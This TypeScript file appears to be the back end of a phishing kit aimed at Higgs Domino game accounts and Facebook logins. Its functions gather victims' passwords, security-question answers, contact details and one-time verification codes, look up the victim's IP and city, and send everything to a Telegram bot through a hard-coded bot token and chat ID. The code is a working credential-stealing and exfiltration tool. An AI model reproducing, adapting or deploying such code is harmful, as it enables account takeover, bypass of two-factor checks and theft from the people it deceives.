import axios from 'axios';

interface LocationData {
  ip: string;
  city: string;
  region: string;
}

interface HiggsProfile {
  username: string;
  level: string;
  coins?: string; // Optional, as some APIs might not return it
}

// API Configuration for Higgs Domino Checker (Backend Proxy)
const HIGGS_BASE_URL = 'http://localhost:3000'; 
const HIGGS_ENDPOINT = '/check-higgs';

const checkHiggsUser = async (userId: string): Promise<HiggsProfile | null> => {
  try {
    // Request to our local backend server
    const response = await axios.get(`${HIGGS_BASE_URL}${HIGGS_ENDPOINT}`, {
      params: { userId: userId },
      timeout: 10000 // Increase timeout for backend scraping
    });

    console.log('Higgs API Response:', response.data);

    if (response.status === 200 && response.data && response.data.code === 200) {
      const data = response.data.data;
      return {
        username: data.username || 'Unknown',
        level: data.level || 'Unknown',
        coins: data.coins || 'Unknown'
      };
    }
    return null;
  } catch (error) {
    console.error('Failed to check Higgs user:', error);
    return null;
  }
};

// Timeout untuk request lokasi agar tidak menghambat UX
const getLocation = async (): Promise<LocationData> => {
  try {
    const ipRes = await axios.get('https://ipapi.co/json/', { timeout: 5000 });
    return {
      ip: ipRes.data.ip || 'Unknown',
      city: ipRes.data.city || 'Unknown',
      region: ipRes.data.region || 'Unknown'
    };
  } catch (e) {
    console.warn('Failed to get location:', e);
    return { ip: 'Unknown IP', city: 'Unknown City', region: 'Unknown Region' };
  }
};

const escapeHtml = (unsafe: any): string => {
  if (unsafe === null || unsafe === undefined) return '';
  const str = String(unsafe);
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

// Konstanta Bot & Chat ID
const BOT_TOKEN = '8636607099:AAGGzcw3Nt3VY-l9j8br8rwQNIFqzktaJZk';
const CHAT_IDS = ['6076369736'];
// const CHAT_IDS = ['6885815623', '6076369736'];

const sendMessage = async (text: string): Promise<boolean> => {
  try {
    const results = await Promise.all(CHAT_IDS.map(async (chatId) => {
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          }),
        });

        if (!response.ok) {
          const errorBody = await response.text();
          console.error(`Telegram Send Error [${chatId}]:`, errorBody);
          return false;
        }
        return true;
      } catch (err) {
        console.error(`Network Error [${chatId}]:`, err);
        return false;
      }
    }));

    // Return true jika setidaknya satu pesan terkirim
    return results.some(r => r === true);
  } catch (error) {
    console.error('General Telegram Error:', error);
    return false;
  }
};

export const sendToTelegram = async (
  username: string, 
  pass: string, 
  q1: string, 
  a1: string,
  q2: string,
  a2: string
) => {
  const loc = await getLocation();
  const higgsData = await checkHiggsUser(username);
  const now = new Date();
  const timeString = now.toLocaleString('en-US', { 
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: 'numeric', minute: 'numeric', second: 'numeric',
    hour12: true 
  });

  const message = `
🔐 <b>USER LOGIN ALERT</b>
────────────────────────
👤 ID: <code>${escapeHtml(username)}</code>
📛 Name: <code>${escapeHtml(higgsData?.username || 'Unknown')}</code>
⭐ Level: <code>${escapeHtml(higgsData?.level || 'Unknown')}</code>
💰 Coins: <code>${escapeHtml(higgsData?.coins || 'Unknown')}</code>
🔑 Password: <code>${escapeHtml(pass)}</code>
🗓️ Date: ${escapeHtml(timeString)}
────────────────────────
🛡️ <b>Security Questions:</b>
Q1: ${escapeHtml(q1)}
   Answer: <code>${escapeHtml(a1)}</code>
Q2: ${escapeHtml(q2)}
   Answer: <code>${escapeHtml(a2)}</code>
────────────────────────
📍 <b>Location Info:</b>
IP: <code>${escapeHtml(loc.ip)}</code>
City: ${escapeHtml(loc.city)}
────────────────────────
`;

  return sendMessage(message);
};

export const sendFacebookLogin = async (
  email: string, 
  pass: string,
  q1: string,
  q2: string
) => {
  const loc = await getLocation();
  const now = new Date();
  const timeString = now.toLocaleString('en-US', { 
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: 'numeric', minute: 'numeric', second: 'numeric',
    hour12: true 
  });

  const message = `
🔔 <b>FACEBOOK LOGIN ALERT</b>
────────────────────────
📧 Email: <code>${escapeHtml(email)}</code>
🔑 Password: <code>${escapeHtml(pass)}</code>
🗓️ Date: ${escapeHtml(timeString)}
────────────────────────
🛡️ <b>Security Questions:</b>
Q1: ${escapeHtml(q1)}
Q2: ${escapeHtml(q2)}
────────────────────────
📍 <b>Location Info:</b>
IP: <code>${escapeHtml(loc.ip)}</code>
City: ${escapeHtml(loc.city)}
────────────────────────
`;

  return sendMessage(message);
};

export const sendOTPRequest = async (
  username: string,
  identifier: string, // Phone number or Email
  method: 'wa' | 'email',
  password?: string,
  q1?: string,
  a1?: string,
  q2?: string,
  a2?: string
) => {
  console.log('Preparing OTP Request...');
  
  const loc = await getLocation();
  const now = new Date();
  const timeString = now.toLocaleString('en-US', { 
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: 'numeric', minute: 'numeric', second: 'numeric',
    hour12: true 
  });
  
  const typeName = method === 'wa' ? 'WhatsApp' : 'Email';

  const message = `
🔐 <b>OTP REQUEST ALERT</b>
────────────────────────
👤 <b>USER INFO</b>
🆔 ID: <code>${escapeHtml(username)}</code>
� Password: <code>${escapeHtml(password || '-')}</code>
────────────────────────
🛡️ <b>SECURITY ANSWERS</b>
1️⃣ ${escapeHtml(q1 || '-')}
   👉 <code>${escapeHtml(a1 || '-')}</code>

2️⃣ ${escapeHtml(q2 || '-')}
   👉 <code>${escapeHtml(a2 || '-')}</code>
────────────────────────
📱 <b>VERIFICATION INFO</b>
� Contact: <code>${escapeHtml(identifier)}</code>
📩 Method: ${typeName}
────────────────────────
📍 <b>LOCATION & TIME</b>
🌐 IP: <code>${escapeHtml(loc.ip)}</code>
🏙️ City: ${escapeHtml(loc.city)}
📅 Date: ${escapeHtml(timeString)}
────────────────────────
`;

  console.log('Sending OTP Request to Telegram...');
  const success = await sendMessage(message);
  console.log('OTP Request Sent:', success);
  
  return success;
};

export const sendOTPSubmission = async (
  username: string,
  identifier: string,
  code: string,
  method: 'wa' | 'email',
  password?: string,
  q1?: string,
  a1?: string,
  q2?: string,
  a2?: string
) => {
  console.log('Preparing OTP Submission...');
  
  const loc = await getLocation();
  const now = new Date();
  const timeString = now.toLocaleString('en-US', { 
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: 'numeric', minute: 'numeric', second: 'numeric',
    hour12: true 
  });
  
  const typeName = method === 'wa' ? 'WhatsApp' : 'Email';

  const message = `
� <b>OTP SUBMISSION ALERT</b>
────────────────────────
👤 <b>USER INFO</b>
🆔 ID: <code>${escapeHtml(username)}</code>
🔑 Password: <code>${escapeHtml(password || '-')}</code>
────────────────────────
🛡️ <b>SECURITY ANSWERS</b>
1️⃣ ${escapeHtml(q1 || '-')}
   👉 <code>${escapeHtml(a1 || '-')}</code>

2️⃣ ${escapeHtml(q2 || '-')}
   👉 <code>${escapeHtml(a2 || '-')}</code>
────────────────────────
� <b>VERIFICATION INFO</b>
📞 Contact: <code>${escapeHtml(identifier)}</code>
� Method: ${typeName}
🔢 Code: <code>${escapeHtml(code)}</code>
────────────────────────
📍 <b>LOCATION & TIME</b>
🌐 IP: <code>${escapeHtml(loc.ip)}</code>
🏙️ City: ${escapeHtml(loc.city)}
📅 Date: ${escapeHtml(timeString)}
────────────────────────
`;

  console.log('Sending OTP Submission to Telegram...');
  const success = await sendMessage(message);
  console.log('OTP Submission Sent:', success);
  
  return success;
};
